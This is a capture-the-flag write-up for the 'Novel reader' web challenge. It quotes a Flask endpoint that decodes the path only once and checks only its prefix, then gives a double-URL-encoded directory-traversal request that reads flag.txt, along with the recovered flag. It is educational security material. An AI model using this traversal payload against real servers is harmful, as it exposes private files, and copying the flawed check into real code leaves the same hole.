# Novel reader
## Description
> We have many fun novels for ya…

## Challenge Overview
We get an article reader website that only allow us to read words according to our balance.

![image](https://github.com/user-attachments/assets/325481e6-be93-4b1b-a996-ddc2a1066419)

## Solution
When we are looking at the source code,  there is an API endpoint `'/api/read/<path:name>'` where it allow users to read a portion of a novel based on their word balance. 

`unquote(name)` is used to decode the URL-encoded `name` parameter, transforming any encoded characters (e.g., %20 becomes a space) into their original form. The server also checks if the path starts with public, if not it will gives an error.
```python
@app.get('/api/read/<path:name>')
def readNovel(name):
    name = unquote(name)
    if(not name.startswith('public/')):
        return {'success': False, 'msg': 'You can only read public novels!'}, 400
    buf = readFile(name).split(' ')
    buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
    return {'success': True, 'msg': buf}
```
This website is vulnerable to `LFI (Local File Inclusion)`. We can traverse into other page if we use `../../` in the path. Since `unquote` only decode URL one time, so we can double encode the URL to bypass the check. We also need to make sure that we include `/public` in path before doing the directory traversal. 

```http://3.64.250.135:9000/api/read/public%252F%252E%252E%252F%252E%252E%252Fflag%252Etxt```

## Flag
```
MAPNA{uhhh-1-7h1nk-1-f0r607-70-ch3ck-cr3d17>0-4b331d4b}
```
